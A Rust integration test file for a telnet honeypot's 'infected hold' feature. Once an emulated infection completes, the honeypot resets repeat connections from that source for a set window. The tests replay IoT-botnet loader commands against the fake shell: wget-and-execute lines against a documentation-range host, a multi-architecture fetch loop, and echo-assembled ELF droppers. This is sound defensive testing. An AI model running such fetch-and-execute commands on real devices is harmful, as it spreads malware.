//! A source whose infection finished is reset on its next connections, through the real telnet
//! listener. A loader that fetches and runs a native build (or assembles one from `echo` chunks and
//! runs it) has infected the box as far as it can tell; on a real device the bot then closes
//! telnetd, so the same loader coming back every minute is the behaviour to stop answering.
//!
//! Addresses are RFC 5737 documentation hosts for the loader's servers. The sources are loopback
//! addresses (127.0.0.1 and 127.0.0.2), the only ones a test can connect from.

use std::collections::HashMap;
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};

use sensor_framework::{
    CaptureMemoryBudget, CommandEventConfig, CommandEventGate, ConnectionBounds,
    DEFAULT_CAPTURE_BUDGET_BYTES_256M, WanResolver,
};
use sensor_telnet::infected_hold::{HoldClock, InfectedHold};
use sensor_wire::{
    SIGNAL_HONEYPOT_CONNECTION, SIGNAL_HONEYPOT_FILE_DOWNLOAD, SIGNAL_HONEYPOT_LOGIN_ATTEMPT,
    SensorEvent,
};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpSocket, TcpStream};
use tokio::task::JoinHandle;

const HOLD_SECS: u64 = 600;
const LOADER_URL: &str = "http://198.51.100.23/bins/x86_64";
const SOURCE_B: &str = "127.0.0.2";

fn bounds() -> ConnectionBounds {
    ConnectionBounds {
        read_timeout: Duration::from_secs(5),
        idle_timeout: Duration::from_secs(5),
        max_duration: Duration::from_secs(60),
        max_captured_bytes: 1_000_000,
        max_concurrent: 100,
    }
}

/// A clock the test moves by hand.
fn manual_clock() -> (HoldClock, Arc<AtomicU64>) {
    let base = Instant::now();
    let offset = Arc::new(AtomicU64::new(0));
    let reader = offset.clone();
    (
        Arc::new(move || base + Duration::from_secs(reader.load(Ordering::SeqCst))),
        offset,
    )
}

struct Sensor {
    addr: SocketAddr,
    log_path: PathBuf,
    hold: Arc<InfectedHold>,
    now: Arc<AtomicU64>,
    handle: JoinHandle<()>,
    _dir: tempfile::TempDir,
}

async fn start(hold_secs: u64) -> Sensor {
    start_with(hold_secs, bounds()).await
}

async fn start_with(hold_secs: u64, bounds: ConnectionBounds) -> Sensor {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let (clock, now) = manual_clock();
    let hold = Arc::new(InfectedHold::with_clock(hold_secs, clock));
    let (addr, handle, _handoff) = sensor_telnet::start_test_server_with_handoff(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds,
        "test".to_string(),
        dir.path().join("outbox"),
        Arc::new(CaptureMemoryBudget::new(DEFAULT_CAPTURE_BUDGET_BYTES_256M)),
        Arc::new(CommandEventGate::new(CommandEventConfig::default())),
        hold.clone(),
    )
    .await
    .unwrap();
    Sensor {
        addr,
        log_path,
        hold,
        now,
        handle,
        _dir: dir,
    }
}

async fn read_until(conn: &mut TcpStream, done: impl Fn(&[u8]) -> bool) -> Vec<u8> {
    let mut buf = Vec::new();
    let mut chunk = [0u8; 4096];
    tokio::time::timeout(Duration::from_secs(10), async {
        while !done(&buf) {
            let n = conn.read(&mut chunk).await.expect("read");
            assert!(n > 0, "connection closed early; got {buf:?}");
            buf.extend_from_slice(&chunk[..n]);
        }
    })
    .await
    .unwrap_or_else(|_| panic!("timed out; got {:?}", String::from_utf8_lossy(&buf)));
    buf
}

/// Connect from `source`, log in and run `lines`, each to its next prompt, then hang up.
async fn session(sensor: &Sensor, source: &str, lines: &[&str]) {
    drop(session_open(sensor, source, lines).await);
}

/// [`session`] without the hang-up: the connection is returned still open.
async fn session_open(sensor: &Sensor, source: &str, lines: &[&str]) -> TcpStream {
    let socket = TcpSocket::new_v4().unwrap();
    socket.bind(format!("{source}:0").parse().unwrap()).unwrap();
    let mut conn = socket.connect(sensor.addr).await.unwrap();
    read_until(&mut conn, |b| b.ends_with(b"login: ")).await;
    conn.write_all(b"admin\r\n").await.unwrap();
    read_until(&mut conn, |b| b.ends_with(b"Password: ")).await;
    conn.write_all(b"admin\r\n").await.unwrap();
    read_until(&mut conn, |b| b.ends_with(b"# ")).await;
    for line in lines {
        conn.write_all(line.as_bytes()).await.unwrap();
        conn.write_all(b"\r\n").await.unwrap();
        read_until(&mut conn, |b| b.ends_with(b"# ")).await;
    }
    conn
}

/// What a new connection from `source` meets: a reset before a byte, or a login prompt.
#[derive(Debug, PartialEq, Eq)]
enum Door {
    Reset,
    Served,
}

async fn knock(sensor: &Sensor, source: &str) -> Door {
    let socket = TcpSocket::new_v4().unwrap();
    socket.bind(format!("{source}:0").parse().unwrap()).unwrap();
    let mut conn = socket.connect(sensor.addr).await.unwrap();
    let mut buf = [0u8; 256];
    match tokio::time::timeout(Duration::from_secs(5), conn.read(&mut buf)).await {
        Ok(Err(e)) if e.kind() == std::io::ErrorKind::ConnectionReset => Door::Reset,
        Ok(Ok(n)) if n > 0 => Door::Served,
        other => panic!("neither a reset nor data: {other:?}"),
    }
}

async fn events(log_path: &Path) -> Vec<SensorEvent> {
    tokio::fs::read_to_string(log_path)
        .await
        .unwrap_or_default()
        .lines()
        .filter_map(|l| serde_json::from_str(l).ok())
        .collect()
}

async fn wait_until(what: &str, done: impl Fn() -> bool) {
    let deadline = Instant::now() + Duration::from_secs(10);
    while !done() {
        assert!(Instant::now() < deadline, "timed out waiting for {what}");
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
}

fn count(events: &[SensorEvent], signal: &str) -> usize {
    events.iter().filter(|e| e.signal_type == signal).count()
}

fn fetch_and_run(url: &str) -> Vec<String> {
    vec![
        format!("cd /tmp; wget -q {url} -O .c"),
        "chmod +x .c".to_string(),
        "./.c".to_string(),
    ]
}

async fn run_lines(sensor: &Sensor, source: &str, lines: &[String]) {
    let refs: Vec<&str> = lines.iter().map(String::as_str).collect();
    session(sensor, source, &refs).await;
}

#[tokio::test]
async fn a_finished_infection_closes_the_door_on_its_source_for_the_hold_and_no_one_else() {
    let sensor = start(HOLD_SECS).await;
    let a = "127.0.0.1";
    let ip_a: std::net::IpAddr = a.parse().unwrap();

    // The first session is served and recorded as ever: connection, login, the fetch.
    run_lines(&sensor, a, &fetch_and_run(LOADER_URL)).await;
    wait_until("the source to be held", || sensor.hold.held_sources() == 1).await;
    let recorded = events(&sensor.log_path).await;
    assert_eq!(count(&recorded, SIGNAL_HONEYPOT_CONNECTION), 1);
    assert_eq!(count(&recorded, SIGNAL_HONEYPOT_LOGIN_ATTEMPT), 1);
    let downloads: Vec<&SensorEvent> = recorded
        .iter()
        .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
        .collect();
    assert_eq!(downloads.len(), 1, "{downloads:?}");
    assert_eq!(downloads[0].metadata["url"], LOADER_URL);

    // The repeat is reset at the socket: no prompt, no event, one refusal counted.
    assert_eq!(knock(&sensor, a).await, Door::Reset);
    assert_eq!(knock(&sensor, a).await, Door::Reset);
    assert_eq!(sensor.hold.refused_from(ip_a), 2);
    assert_eq!(sensor.hold.refused_total(), 2);
    let after = events(&sensor.log_path).await;
    assert_eq!(count(&after, SIGNAL_HONEYPOT_CONNECTION), 1, "no new event");

    // The refusal summary names the source and its count, then starts over.
    let summary = sensor.hold.take_summary().expect("refusals to summarize");
    assert_eq!(summary.refused, 2);
    assert_eq!(summary.sources, 1);
    assert_eq!(summary.held_now, 1);
    assert!(sensor.hold.take_summary().is_none());

    // Another source is served normally.
    assert_eq!(knock(&sensor, SOURCE_B).await, Door::Served);

    // Inside the window it stays shut; at its end the source is served again.
    sensor.now.store(HOLD_SECS - 1, Ordering::SeqCst);
    assert_eq!(knock(&sensor, a).await, Door::Reset);
    sensor.now.store(HOLD_SECS, Ordering::SeqCst);
    assert_eq!(knock(&sensor, a).await, Door::Served);
    assert_eq!(
        sensor.hold.held_sources(),
        0,
        "the expired entry was dropped"
    );
    sensor.handle.abort();
}

#[tokio::test]
async fn an_ipv4_source_is_held_alone_not_its_neighbours() {
    let sensor = start(HOLD_SECS).await;
    run_lines(&sensor, "127.0.0.1", &fetch_and_run(LOADER_URL)).await;
    wait_until("the source to be held", || sensor.hold.held_sources() == 1).await;
    assert_eq!(knock(&sensor, "127.0.0.1").await, Door::Reset);
    assert_eq!(knock(&sensor, SOURCE_B).await, Door::Served);
    sensor.handle.abort();
}

#[tokio::test]
async fn a_build_for_another_cpu_alone_does_not_hold_the_source() {
    let sensor = start(HOLD_SECS).await;
    run_lines(
        &sensor,
        "127.0.0.1",
        &fetch_and_run("http://198.51.100.23/bins/mips"),
    )
    .await;
    // The session has ended once its connection is gone; give it time to reach `Drop`.
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert_eq!(sensor.hold.held_sources(), 0);
    assert_eq!(knock(&sensor, "127.0.0.1").await, Door::Served);
    sensor.handle.abort();
}

#[tokio::test]
async fn a_loop_that_reaches_the_native_build_holds_the_source() {
    let sensor = start(HOLD_SECS).await;
    let lines = vec![
        "cd /tmp; for a in mips arm7 x86_64; do wget -q http://198.51.100.23/bins/$a -O .c; \
         chmod +x .c; ./.c && break; done"
            .to_string(),
    ];
    run_lines(&sensor, "127.0.0.1", &lines).await;
    wait_until("the source to be held", || sensor.hold.held_sources() == 1).await;
    assert_eq!(knock(&sensor, "127.0.0.1").await, Door::Reset);
    sensor.handle.abort();
}

#[tokio::test]
async fn a_download_that_is_never_run_does_not_hold_the_source() {
    let sensor = start(HOLD_SECS).await;
    let lines = vec![
        format!("cd /tmp; wget -q {LOADER_URL} -O .c"),
        "chmod +x .c".to_string(),
    ];
    run_lines(&sensor, "127.0.0.1", &lines).await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert_eq!(sensor.hold.held_sources(), 0);
    assert_eq!(knock(&sensor, "127.0.0.1").await, Door::Served);
    sensor.handle.abort();
}

#[tokio::test]
async fn an_echo_assembled_program_that_runs_holds_the_source() {
    let sensor = start(HOLD_SECS).await;
    let lines = vec![
        r"cd /tmp; echo -ne '\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00' > .i".to_string(),
        r"echo -ne '\x01\x02\x03\x04' >> .i; chmod 777 .i".to_string(),
        "./.i".to_string(),
    ];
    run_lines(&sensor, "127.0.0.1", &lines).await;
    wait_until("the source to be held", || sensor.hold.held_sources() == 1).await;
    assert_eq!(knock(&sensor, "127.0.0.1").await, Door::Reset);
    sensor.handle.abort();
}

#[tokio::test]
async fn a_session_that_only_probes_does_not_hold_the_source() {
    let sensor = start(HOLD_SECS).await;
    let lines = vec![
        "cd /tmp; echo ok > .t; chmod +x .t; ./.t".to_string(),
        "uname -a".to_string(),
    ];
    run_lines(&sensor, "127.0.0.1", &lines).await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert_eq!(sensor.hold.held_sources(), 0);
    sensor.handle.abort();
}

/// The listener cancels a handler at `max_duration`, so a loader that finishes and then sits on its
/// connection is held by what the cancelled session had already seen.
#[tokio::test]
async fn a_session_cut_off_at_max_duration_after_the_infection_still_holds_the_source() {
    let mut cut = bounds();
    cut.max_duration = Duration::from_secs(2);
    let sensor = start_with(HOLD_SECS, cut).await;
    let lines = fetch_and_run(LOADER_URL);
    let refs: Vec<&str> = lines.iter().map(String::as_str).collect();
    let _open = session_open(&sensor, "127.0.0.1", &refs).await;
    assert_eq!(sensor.hold.held_sources(), 0, "the session is still open");
    wait_until("the cancelled session to hold its source", || {
        sensor.hold.held_sources() == 1
    })
    .await;
    assert_eq!(knock(&sensor, "127.0.0.1").await, Door::Reset);
    sensor.handle.abort();
}

#[tokio::test]
async fn a_zero_hold_serves_every_session() {
    let sensor = start(0).await;
    run_lines(&sensor, "127.0.0.1", &fetch_and_run(LOADER_URL)).await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert_eq!(sensor.hold.held_sources(), 0);
    assert_eq!(knock(&sensor, "127.0.0.1").await, Door::Served);
    run_lines(&sensor, "127.0.0.1", &fetch_and_run(LOADER_URL)).await;
    sensor.handle.abort();
}
